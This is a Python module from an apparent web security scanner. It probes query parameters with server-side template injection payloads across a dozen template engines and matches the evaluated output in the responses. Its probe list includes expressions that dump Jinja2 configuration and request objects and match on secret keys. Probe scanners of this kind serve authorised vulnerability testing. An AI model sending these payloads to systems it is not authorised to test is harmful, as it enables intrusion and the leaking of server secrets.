"""
SSTI (Server-Side Template Injection) bypass module.

Injects arithmetic expressions that template engines evaluate. Looks for
the computed result (e.g. 49 for 7*7) in the response body to confirm.

Supported engine probes:
  Engine          Syntax          Result marker
  ─────────────── ─────────────── ─────────────
  Jinja2 / Twig   {{7*7}}         49
  Jinja2 (str)    {{7*'7'}}       7777777  (Jinja2) / 49 (Twig)
  Freemarker      ${7*7}          49
  JSP EL          ${7*7}          49  (same probe, different engine)
  Velocity        #set($x=7*7)$x  49
  ERB (Ruby)      <%= 7*7 %>      49
  Slim / Pug      #{7*7}          49
  Razor (.NET)    @(7*7)          49
  Mako            ${7*7}          49
  Smarty          {7*7}           49
  Pebble          {{7*7}}         49
  Groovy          ${7*7}          49

Injection points:
  - All query parameters
  - Path segments (if param=None and URL contains template-like segments)
"""

import asyncio
import re
from typing import Optional
from urllib.parse import urlparse, parse_qs

import httpx

from . import BypassResult

try:
    from scope_validator import ScopeValidator
except ImportError:
    ScopeValidator = None
try:
    from rate_limiter import RateLimiter
except ImportError:
    RateLimiter = None

# ---------------------------------------------------------------------------
# Payloads
# ---------------------------------------------------------------------------

# (category/engine, expression, expected_result_pattern)
_PROBES: list[tuple[str, str, str]] = [
    ("jinja2_twig",   "{{7*7}}",                    r"\b49\b"),
    ("jinja2_str",    "{{7*'7'}}",                   r"7{7}|49"),   # 7777777 or 49
    ("freemarker",    "${7*7}",                       r"\b49\b"),
    ("velocity",      "#set($x=7*7)${x}",            r"\b49\b"),
    ("erb_ruby",      "<%= 7*7 %>",                  r"\b49\b"),
    ("slim_pug",      "#{7*7}",                      r"\b49\b"),
    ("razor_dotnet",  "@(7*7)",                      r"\b49\b"),
    ("smarty",        "{7*7}",                       r"\b49\b"),
    ("generic_dollar","${7*7}",                      r"\b49\b"),
    ("generic_at",    "@{7*7}",                      r"\b49\b"),
    # Deeper probes — look for config/class objects (confirms Jinja2/Python)
    ("jinja2_config", "{{config}}",                  r"Config|SECRET|DEBUG|SQLALCHEMY"),
    ("jinja2_request","{{request}}",                 r"Request|environ|werkzeug|flask"),
    ("jinja2_class",  "{{''.__class__}}",            r"<class 'str'>|type 'str'"),
]

# ---------------------------------------------------------------------------
# SSTIBypass
# ---------------------------------------------------------------------------

class SSTIBypass:
    name = "SSTI"
    description = "Server-Side Template Injection"
    requires_param = False

    async def detect(
        self,
        target: str,
        client: httpx.AsyncClient,
        limiter,
    ) -> bool:
        """Quick check: inject {{7*7}} into first param, look for 49."""
        qs = parse_qs(urlparse(target).query)
        if not qs:
            return False
        param = next(iter(qs))
        sep = "&" if "?" in target else "?"
        url = f"{target}{sep}{param}={{{{7*7}}}}"
        try:
            async with limiter.http():
                resp = await client.get(url)
                limiter.adapt_to_response(resp)
                return bool(re.search(r"\b49\b", resp.text))
        except httpx.RequestError:
            return False

    async def scan(
        self,
        target: str,
        client: httpx.AsyncClient,
        sem: asyncio.Semaphore,
        limiter,
        param: Optional[str] = None,
    ) -> list[BypassResult]:
        # Collect injection params
        parsed = urlparse(target)
        qs = parse_qs(parsed.query)

        if param:
            params = [param]
        elif qs:
            params = list(qs.keys())
        else:
            # No query params — inject directly into path (common with some frameworks)
            params = ["_ssti_probe"]

        tasks: list[tuple[str, str, str, str]] = []  # (param, engine, expr, pattern)
        for p in params:
            for engine, expr, pattern in _PROBES:
                sep = "&" if "?" in target else "?"
                url = f"{target}{sep}{p}={expr}"
                tasks.append((p, engine, url, pattern))

        coros = [
            self._probe(param_name, engine, url, pattern, target, client, sem, limiter)
            for param_name, engine, url, pattern in tasks
        ]
        raw = await asyncio.gather(*coros, return_exceptions=True)

        results: list[BypassResult] = []
        for (param_name, engine, url, pattern), result in zip(tasks, raw):
            if isinstance(result, Exception):
                expr = next(e for _, e, p in _PROBES if p == pattern)
                results.append(BypassResult(
                    success=False, vuln_type="ssti", technique="param_injection",
                    category=engine, payload=f"{param_name}={expr}", url=url,
                    status_code=0, evidence="", note=f"error: {result}",
                ))
            else:
                results.append(result)
        return results

    async def _probe(
        self,
        param_name: str,
        engine: str,
        url: str,
        pattern: str,
        target: str,
        client: httpx.AsyncClient,
        sem: asyncio.Semaphore,
        limiter,
    ) -> BypassResult:
        # Extract the expression from the URL for display
        expr = url.split(f"{param_name}=", 1)[-1] if f"{param_name}=" in url else url

        async with sem:
            try:
                async with limiter.http():
                    resp = await client.get(url)
                    limiter.adapt_to_response(resp)
            except httpx.RequestError as e:
                return BypassResult(
                    success=False, vuln_type="ssti", technique="param_injection",
                    category=engine, payload=f"{param_name}={expr}", url=url,
                    status_code=0, evidence="", note=f"request_error: {e}",
                )

        matched = bool(re.search(pattern, resp.text, re.IGNORECASE))
        note = f"engine: {engine}" if matched else ""

        return BypassResult(
            success=matched,
            vuln_type="ssti",
            technique="param_injection",
            category=engine,
            payload=f"{param_name}={expr}",
            url=url,
            status_code=resp.status_code,
            evidence=resp.text[:300],
            note=note,
        )
